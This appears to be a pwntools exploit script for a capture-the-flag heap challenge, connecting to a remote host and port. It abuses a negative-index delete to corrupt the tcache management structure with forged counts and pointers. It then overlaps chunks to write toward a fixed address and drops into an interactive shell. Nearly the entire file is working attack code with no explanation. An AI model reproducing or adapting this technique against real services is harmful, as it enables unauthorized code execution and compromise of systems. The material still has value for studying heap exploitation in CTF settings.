from pwn import *

#context.terminal=['tmux', 'splitw', '-h']

prog = '/home/ctf/pwn'
p = remote("xray.wwb.email", 23333)#nc 124.71.130.185 49155
# p = remote("127.0.0.1", 9999)#nc 124.71.130.185 49155
context.log_level = 'debug'

def choice(idx):
    p.sendlineafter("> ",str(idx))

def add(sz,con):
    choice(1)
    sleep(0.1)
    p.sendline(str(sz))
    sleep(0.1)
    p.sendline(con)
    # sa("content?",cno)

def delete(idx):
    choice(2)
    sleep(0.1)
    p.sendline(str(idx))

def exp():
    add(0x90,p64(0)*3+p64(0x400))

    add(0x280,'init-0')
    for i in range(16):
        add(i*0x10+0xa0,(p64(0)+p64(0)+p64(0)+p64(0x21)+(p64(0)+p64(0x61))*int((i*0x10+0x70)/0x10)))
    
    #input()
    delete(-0x290)
    #fake_t = p16(7)*8*3
    choice(2)           #调用一次puts因为puts要申请内存。
    #add(0x280,fake_t)
    #input()

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*8+p8(0xe0)
    add(0x280,fake_t)
    #input()
    # add(0x50,'a')
    add(0x90,'a')
    #input()

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*10+p8(0xc0)
    add(0x280,fake_t)
    #input()   
    add(0xb0,'a')
    #input()

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*11+p8(0x80)
    add(0x280,fake_t)   
    add(0xc0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*12+p8(0x50)
    add(0x280,fake_t)   
    add(0xd0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*13+p8(0x30)
    add(0x280,fake_t)   
    add(0xe0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*14+p8(0x20)
    add(0x280,fake_t)   
    add(0xf0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*15+p8(0x20)
    add(0x280,fake_t)   
    add(0x100,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*16+p8(0x30)
    add(0x280,fake_t)   
    add(0x110,'a')
    input()

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*40
    add(0x280,fake_t)   
    input()
    pay = 0x3d0*b'a'+p64(0)+p64(0x21)+p64(0x404070)
    add(0x3f0,pay)

    input()
    add(0x10,'a')
    #input()

    p.interactive()

exp()